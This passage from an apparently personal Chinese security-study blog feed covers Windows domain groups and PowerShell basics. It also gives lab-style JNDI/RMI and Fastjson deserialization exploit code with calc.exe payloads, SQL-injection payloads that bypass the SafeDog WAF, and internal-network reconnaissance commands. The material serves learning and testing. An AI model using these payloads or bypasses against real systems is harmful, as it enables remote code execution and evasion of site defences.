<li>帐号操作员组(Account Operators)的成员可以管理域中的用户和组，也可以在本地登录DC。但是无法更改<code>Administarotrs</code>, <code>Domain Admins</code>组。默认情况下该组没有成员</li>
<li>服务器操作员组(Server Operator)成员可以管理域服务器，包括管理任意服务器的共享目录，关闭DC等….默认情况下该组没有成员</li>
<li>备份操作员组(Backop Operators)的成员可以在DC中执行备份和还原操作，并可以在本地登录，和关闭域控。默认情况下该组没有成员</li>
</ul>
<h4 id="系统默认全局组"><a href="#系统默认全局组" class="headerlink" title="系统默认全局组"></a>系统默认全局组</h4><ul>
<li>域管理员组(Domain Admins)的成员在加入域的服务器，DC, AD中都具有管理员权限。同时会添加到所在域的<code>Adminstrator</code>组中，同时会默认添加到域中所有计算机的本地<code>Administrators</code>组中。域管理员组获得了域中所有计算机的<code>Administrator</code>权限。<br>如果希望用户成为域管理员，建议将用户添加到<code>Domain Admins</code>组中而不是<code>Administrators</code>组</li>
<li>企业系统管理员组(Enterprise Admins)是域森林根域中的组。该组在森林的每个域内都是<code>Administrators</code>组的成员。对所有DC具有完全访问权</li>
<li>架构管理员组(Schema Admins)是域森林根域中的一个组。可以修改AD和域森林模式。该组为AD和DC提供完整权限的组</li>
<li>域用户组(Domain Users)组默认情况下，任何用户账户都属于<code>Domian Users</code>组。而由我们建立的计算机帐号属于<code>Domain Computers</code>组。如果想要将权限赋予所有用户，即可将权限赋予域用户组，或者将域用户组属于具有该权限的组。域用户组默认是内置域<code>Users</code>组的成员</li>
</ul>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全攻防笔记1.2</title>
    <url>/2022/04/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B01-2/</url>
    <content><![CDATA[<h1 id="内网安全攻防笔记1-2"><a href="#内网安全攻防笔记1-2" class="headerlink" title="内网安全攻防笔记1.2"></a>内网安全攻防笔记1.2</h1><h2 id="PowerShell基本概念"><a href="#PowerShell基本概念" class="headerlink" title="PowerShell基本概念"></a>PowerShell基本概念</h2><h3 id="ps1文件"><a href="#ps1文件" class="headerlink" title=".ps1文件"></a>.ps1文件</h3><p>类似于.bat文件。PowerShell脚本使用.ps1作为后缀，每行一条指令。</p>
<span id="more"></span>

<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>PowerShell设置了默认执行策略无法运行.ps1脚本。可以使用指令<code>Get-ExecutionPolicy</code>查看当前执行策略。<br>而执行策略有以下:</p>
<ul>
<li>Restricted(默认设置，脚本无法运行)</li>
<li>RemoteSigned(在本地创建的脚本可以运行，但是网上下载的脚本无法运行用于数字证书签名除外)</li>
<li>AllSigned(仅当脚本由受信任的发布者签名时才可以运行)</li>
<li>Unrestricted(运行所有脚本运行)</li>
</ul>
<p>可以使用<code>Set-ExecutionPolicy &lt;Policy name&gt;</code>设置PowerShell执行策略</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道的作用是将一个命令的输出，作为另一个命令的输入使用。两个命令之间用<code>|</code>连接。<br>如以字符’p’开头的程序停止运行<code>get-process p* | stop-process</code></p>
<h2 id="PowerShell常用命令"><a href="#PowerShell常用命令" class="headerlink" title="PowerShell常用命令"></a>PowerShell常用命令</h2><h3 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h3><p>在PowerShell中，命令叫做<code>cmdlet</code>命令。PowerShell命令不区分大小写。一下是PowerShell基本命令。</p>
<ul>
<li>新建目录 <code>New-item PowerShellStudy -itemtype directory</code></li>
<li>新建文件 <code> New-Item test.txt -ItemType File</code></li>
<li>删除目录 <code>Remove-Item xyz</code></li>
<li>显示文本内容 <code>Get-Content .\test.txt</code></li>
<li>设置文本内容 <code>Set-Content .\test.txt -Value &quot;Hello World&quot;</code></li>
<li>追加文本内容 <code>Add-Content .\test.txt -Value &quot;Its a test&quot;</code></li>
<li>删除文本内容 <code>Clear-Content .\test.txt</code></li>
</ul>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3>]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI注入</title>
    <url>/2022/03/31/JNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="JNDI注入与Fastjson反序列化"><a href="#JNDI注入与Fastjson反序列化" class="headerlink" title="JNDI注入与Fastjson反序列化"></a>JNDI注入与Fastjson反序列化</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7027#toc-5">https://xz.aliyun.com/t/7027#toc-5</a></p>
<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI全名为``Java Naming and Directory Interface<code>，</code>Java命名和目录接口<code>。通过JNDI这个接口，可以调用如LDAP, RMI, DNS, NIS，许多种服务。在JNDI中通过</code>Lookup(url)<code>去调用远程代码。如果我们可以控制</code>url`参数，更改为恶意远程服务器地址。可以通过JNDI配合RMI和LDAP让服务端运行我们部署在公网上的恶意类。</p>
<span id="more"></span>

<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>通过RMI可以让用户调用远程服务器上的代码，但是一般RMI是将数据发送到服务端实现代码的远程调用。但是如果RMI通过一个<code>Reference类</code>绑定一个外部远程对象。如果用户在当前目录没有这个对象，这用户将通过<code>Reference</code>中设置的远程地址和<code>Factory</code>去引用远程外部类，并且实例化。</p>
<p>服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">            Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;whatever&quot;</span>, <span class="string">&quot;jndi.Calc&quot;</span>, <span class="string">&quot;http://localhost/&quot;</span>);</span><br><span class="line">            ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">&quot;calc&quot;</span>, wrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上面的代码中我们先在本地的1099端口创建了一个<code>Registry</code>然后创建了一个<code>Refernce</code>其中第一个字段可以随意填写。第二个字段是类的地址，第三个字段是加载类的远程地址。在最后将<code>Reference</code>绑定在<code>Registry</code>中的<code>calc</code>上。</p>
<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1234</span>);</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">         ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端代码去通过RMI协议调用对应地址的calc。</p>
<p>恶意代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;data block&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;static data block&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;mehtod &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;getObectIstat&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>启用RMI服务器和本地HTTP服务器。将对应字节码放在HTTP服务器上。然后运行客户端调用RMI时，我们成功弹出了计算器。并且代码执行顺序为</p>
<ol>
<li>静态代码块</li>
<li>代码块</li>
<li>构造函数</li>
<li>getObjectInstance方法</li>
</ol>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416150939.png"></p>
<p>但是HTTP服务器上日志没有对应访问记录。因为在同一个文件夹中，存在calc.class文件，可以直接从本地访问因此不需要从外部访问。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416151229.png"></p>
<p>当删除文件夹中的clac.class文件，再次运行。这次在日志中就出现了对应的访问记录。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416152058.png"></p>
<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>暂时没看</p>
<h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>序列化:  <code>Stirng text =  JSON.toJSONString(obj)</code></p>
<p>反序列化:</p>
<ol>
<li><code>obj = JSON.parse(text)  //解析为JSONobject 类型或者 JSONArray类型</code></li>
<li><code>obj = jSON.parseObject(text)   //解析为JSONObject类型</code></li>
<li><code>obj = JSON.parseObject(text, String.class) //解析为特定的类</code></li>
</ol>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h4><p>这里先不看细节，因为我也没看。总而言之就是这三个方法会调用目标类某些<code>setter</code>方法和某些<code>getter</code>方法。由这个地方我们不由得想到了CC3.我们知道CC3最后的<code>TemplateImpl</code>类中可以通过<code>getter</code>方法来实现加载字节码达到RCE。由此我们可以构造一个JSON字符串，在反序列化是通过调用<code>getter</code>方法来实现RCE。</p>
<p>evil.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;asdfasfsafasdf&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson124;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> common.Common;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates= <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        ClassPool  classPool = ClassPool.getDefault();</span><br><span class="line">        <span class="keyword">byte</span>[] code  = classPool.get(evil.Evil.class.getName()).toBytecode();</span><br><span class="line">        String base64 = Base64.encodeBase64String(code);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;sdf&quot;</span>);</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        User use1 = <span class="keyword">new</span> User();</span><br><span class="line">        use1.setAge(<span class="number">1234</span>);</span><br><span class="line">        use1.setName(<span class="string">&quot;1234&quot;</span>);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;evil.class&quot;</span>);</span><br><span class="line">        fos.write(code);</span><br><span class="line">        fos.close();</span><br><span class="line">        String jsonStr = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot; : \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;_bytecodes\&quot; : [\&quot;&quot;</span>+ base64+ <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;_name\&quot; : \&quot;a\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;_tfactory\&quot; : &#123;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;outputProperties\&quot; : &#123;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(jsonStr);</span><br><span class="line">        String serString1 = JSON.toJSONString(use1);</span><br><span class="line">        System.out.println(serString1);</span><br><span class="line"><span class="comment">//        JSON.parseObject(jsonStr, Feature.SupportNonPublicField);</span></span><br><span class="line">        JSON.parse(jsonStr, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        String serString = JSON.toJSONString(templates);</span></span><br><span class="line"><span class="comment">//        System.out.println(serString);</span></span><br><span class="line"><span class="comment">//        Object obj = JSON.parseObject(serString);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>但是这个有很大的局限性，在反序列化时设置了<code>private</code>属性，因此在反序列化时需要设置<code> Feature.SupportNonPublicField</code>来允许，但是一般在现实中一般不会设置这个选项。</p>
<h4 id="JNDI-1"><a href="#JNDI-1" class="headerlink" title="JNDI"></a>JNDI</h4><p>一般FastJson在反序列化时都是通过JNDI来实现注入。JNDI除了可以用之前的方法也可以用别的方法来实现对应的调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/aa&quot;</span>);<span class="comment">//可控uri</span></span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码同样可以调用到远程RMI。也是使用<code>setter</code>方法。同样可以构造恶意JSON字符串来实现JNDI注入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson124;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiJson</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String jsonJndiStir = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/calc\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(jsonJndiStir );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416162942.png"></p>
<p>对应的HTTP也有对应的访问日志记录</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416163016.png"></p>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>LDAP和FastJson大量的细节与后续的修复以及绕过以后再说….</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>JNDI</tag>
        <tag>反序列化</tag>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入过狗V4.0.2313</title>
    <url>/2022/04/16/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E7%8B%97V4-0-2313/</url>
    <content><![CDATA[<h1 id="SQL注入过安全狗-Apache版-V4-0-2323"><a href="#SQL注入过安全狗-Apache版-V4-0-2323" class="headerlink" title="SQL注入过安全狗 Apache版 V4.0.2323"></a>SQL注入过安全狗 Apache版 V4.0.2323</h1><h2 id="摘抄https-zone-huoxian-cn-d-1069-sqlbypass"><a href="#摘抄https-zone-huoxian-cn-d-1069-sqlbypass" class="headerlink" title="摘抄https://zone.huoxian.cn/d/1069-sqlbypass"></a>摘抄<a href="https://zone.huoxian.cn/d/1069-sqlbypass">https://zone.huoxian.cn/d/1069-sqlbypass</a></h2><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>内联注释的基本语法如下，内联注释是为了方便在不同版本的Mysql中运行语句而成立的<span id="more"></span>。</p>
<p><code>/*!       */</code></p>
<p>当我们再<code>!</code>后直接写sql语句时，当前sql语句会被正常执行。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416194900.png"></p>
<p>但是如果在<code>!</code>后接入数字，代表当前Mysql版本。如果当前版本小于数字版本则语句不会运行。比如当前版本为<code>5.05.53</code>那如果输入<code>select /*!50554@@version*/</code>则 <code>@@version</code>相当于被注释。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416195010.png"></p>
<h3 id="绕过or"><a href="#绕过or" class="headerlink" title="绕过or"></a>绕过or</h3><p>id=1’ or 1 –+ // 过滤<br>id=1’ or /<em>/</em>/ 1 //不过滤<br>?id=1’ or /*/**/ 1=1  –+ //不过滤</p>
<p>通过 or /*/**/ 1=1 绕过  <code>or 1=1</code></p>
<h3 id="绕过-order-by"><a href="#绕过-order-by" class="headerlink" title="绕过 order by"></a>绕过 order by</h3><p>通过 <code>order/*/**/by</code>绕过 <code>order by</code></p>
<h3 id="绕过-union-select"><a href="#绕过-union-select" class="headerlink" title="绕过 union select"></a>绕过 union select</h3><p><code>?id=1&#39;  union%23%0a%23%0a%23%0aselect</code> </p>
<h3 id="绕过-database"><a href="#绕过-database" class="headerlink" title="绕过 database()"></a>绕过 database()</h3><p>使用 %23%0a和内联注释将两个()分隔</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1&#x27; union%23%0a%23%0a%23%0aselect 1,database/*!(*//*!%23%0a)*/ -- + //不拦截</span><br><span class="line">name=1&#x27; union%23%0a%23%0a%23%0aselect 1,database/*!(*/%23%0a/*!)*/ -- +  //不拦截</span><br></pre></td></tr></table></figure>

<h3 id="绕过select-infomation-schema"><a href="#绕过select-infomation-schema" class="headerlink" title="绕过select *** infomation_schema"></a>绕过select *** infomation_schema</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union%23%0a%23%0a%23%0aselect 1,group_concat(table_name) , 3  from/*!/*REGEXP &quot;[…%0a%23]&quot;*/%0ainformation_schema.tables*//*/**/  where table_schema=&#x27;security&#x27;-- +</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WAF</category>
      </categories>
      <tags>
        <tag>Sql注入</tag>
        <tag>安全狗</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全攻防笔记2-1</title>
    <url>/2022/04/19/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B02-1/</url>
    <content><![CDATA[<h1 id="内网安全攻防笔记2-1-手动信息收集"><a href="#内网安全攻防笔记2-1-手动信息收集" class="headerlink" title="内网安全攻防笔记2-1 手动信息收集"></a>内网安全攻防笔记2-1 手动信息收集</h1><h2 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h2><p><code>ipconfig /all</code></p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419192742.png"></p>
<h2 id="查询操作系统及软件信息"><a href="#查询操作系统及软件信息" class="headerlink" title="查询操作系统及软件信息"></a>查询操作系统及软件信息</h2><h3 id="查询操作系统和版本信息"><a href="#查询操作系统和版本信息" class="headerlink" title="查询操作系统和版本信息"></a>查询操作系统和版本信息</h3><p><code>Systeminfo | findstr /B /C : &quot;OS&quot;</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419193205.png"></p>
<h3 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h3><p><code>echo %PROCESSOR_ARCHITECTURE%</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419193440.png"></p>
<h3 id="查看安装的软件版本，路径"><a href="#查看安装的软件版本，路径" class="headerlink" title="查看安装的软件版本，路径"></a>查看安装的软件版本，路径</h3><p>利用 wmic 获得软件子， 版本<br><code>wmic product get name, version</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419194200.png"><br>利用PowerShell命令，收集软件的版本信息。<br><code>powershell &quot;Get-wmiObject -class win32_product | select-object -property name,version&quot;</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419195156.png"></p>
<h2 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h2><p><code>wmic service list brief</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419195216.png"></p>
<h2 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h2><p><code>tasklist</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419195324.png"><br><code>wmic process list brief</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419195349.png"></p>
<h2 id="查看启动程序信息"><a href="#查看启动程序信息" class="headerlink" title="查看启动程序信息"></a>查看启动程序信息</h2><p><code>wmic startup get command, caption</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419201115.png"></p>
<h2 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h2><p><code>schtasks /query /fo LIST /v</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419201245.png"></p>
